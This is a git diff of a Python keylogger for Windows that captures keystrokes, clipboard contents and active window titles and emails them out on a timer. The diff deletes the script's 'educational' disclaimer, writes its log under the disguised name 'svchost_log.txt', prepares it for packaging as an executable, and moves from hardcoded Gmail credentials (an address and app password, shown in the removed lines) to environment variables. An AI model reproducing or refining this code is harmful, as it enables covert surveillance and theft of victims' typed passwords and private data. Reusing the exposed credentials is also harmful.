@@ -1,24 +1,3 @@
-"""
-Educational Keylogger Script
-============================
-
-DISCLAIMER:
-This script is for educational purposes only. Unauthorized use of keyloggers or
-monitoring tools is illegal and unethical. Use responsibly and only with explicit
-consent from users.
-
-Features:
-- Logs keystrokes and clipboard data.
-- Sends logs to an email address periodically.
-- Registers itself to run at system startup.
-
-Modules:
-- pynput: For listening to keyboard events.
-- pyperclip: For clipboard monitoring.
-- smtplib: For email functionality.
-- winreg: For registry modifications.
-"""
-
 import os
 import sys
 import time
@@ -35,9 +14,6 @@ import win32gui
 def get_active_window():
     return win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
-# Globals
-#log_file_path = "config.txt"
-
 # Get the user's AppData\Local directory dynamically
 log_file_path = os.path.join(os.getenv('LOCALAPPDATA'), "svchost_log.txt")
 current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -45,7 +21,6 @@ window = get_active_window()
 current_user = os.getenv("USERNAME")
 email_interval = 3600
 
-'''
 # Load environment variables
 if getattr(sys, "frozen", False):
     # the app is frozen -- comp with pyins
@@ -61,17 +36,10 @@ if os.path.exists(env_path):
     print(".env file loaded successfully")
 else:
     print("Error: .env file not found")
-'''
 
-load_dotenv()
-
-# EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
-# EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
-# RECIPIENT_EMAIL = os.getenv("RECIPIENT_EMAIL")
-
-EMAIL_ADDRESS = "damolaap@gmail.com"
-EMAIL_PASSWORD = "vsikvtwyocheyndn"
-RECIPIENT_EMAIL = "apexp8379@gmail.com"
+EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
+RECIPIENT_EMAIL = os.getenv("RECIPIENT_EMAIL")
 
 if not all([EMAIL_ADDRESS, EMAIL_PASSWORD, RECIPIENT_EMAIL]):
     raise ValueError("Email credentials or recipient email not found.")
